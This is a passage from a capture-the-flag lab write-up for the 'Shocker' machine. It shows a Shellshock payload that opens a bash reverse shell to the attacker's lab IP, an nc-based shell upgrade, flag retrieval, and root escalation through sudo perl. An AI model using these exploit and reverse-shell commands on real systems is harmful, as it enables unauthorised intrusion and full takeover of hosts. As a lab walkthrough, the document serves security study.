<p>The following bash reverse shell works.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">()</span> <span class="o">{</span> :<span class="p">;</span><span class="o">}</span><span class="p">;</span> echo<span class="p">;</span> <span class="nb">echo</span> <span class="s2">&#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.83/53 0&gt;&amp;1&#34;</span> <span class="p">|</span> /bin/bash
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210711093314357.png" alt="image-20210711093314357"  /></div>
</p>
<h4 id="shell-upgrade">Shell Upgrade</h4>
<p>I&rsquo;ll upgrade my shell using the PTY trick (that&rsquo;s how I called it).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">shelly@Shocker:/usr/lib/cgi-bin$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl">shelly@Shocker:/usr/lib/cgi-bin$ script /dev/null -c bash                    
</span></span><span class="line"><span class="cl">script /dev/null -c bash
</span></span><span class="line"><span class="cl">Script started, file is /dev/null
</span></span><span class="line"><span class="cl">shelly@Shocker:/usr/lib/cgi-bin$ ^Z
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">7339</span> suspended  nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">→ kali@kali «shocker» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">7339</span> continued  nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">shelly@Shocker:/usr/lib/cgi-bin$  
</span></span></code></pre></div><p>The user flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">shelly@Shocker:/home/shelly$ ls -l 
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> shelly shelly <span class="m">4096</span> Jul <span class="m">10</span> 03:31 <span class="nb">test</span>
</span></span><span class="line"><span class="cl">-r--r--r-- <span class="m">1</span> root   root     <span class="m">33</span> Jul  <span class="m">9</span> 01:17 user.txt
</span></span><span class="line"><span class="cl">shelly@Shocker:/home/shelly$ cat user.txt 
</span></span><span class="line"><span class="cl">7ac9eb73e6cb...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>A quick check on sudo privileges reveals that user <code>shelly</code> can run <code>perl</code> with <code>sudo</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
</span></span><span class="line"><span class="cl">sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> shelly on Shocker:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User shelly may run the following commands on Shocker:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/perl
</span></span></code></pre></div><h4 id="sudo---perl">Sudo - perl</h4>
<p>Using <a href="https://gtfobins.github.io/gtfobins/perl/#sudo">GTFOBins</a> as reference, I&rsquo;m now root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">shelly@Shocker:/home/shelly$ sudo -u root perl -e <span class="s1">&#39;exec &#34;/bin/bash&#34;;&#39;</span>
</span></span><span class="line"><span class="cl">root@Shocker:/home/shelly# id <span class="o">&amp;&amp;</span> hostname
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span><span class="line"><span class="cl">Shocker
</span></span><span class="line"><span class="cl">root@Shocker:/home/shelly#
</span></span></code></pre></div><p>The root flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@Shocker:~# cat root.txt
</span></span><span class="line"><span class="cl">e3689b13acb2...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
  </channel>
</rss>
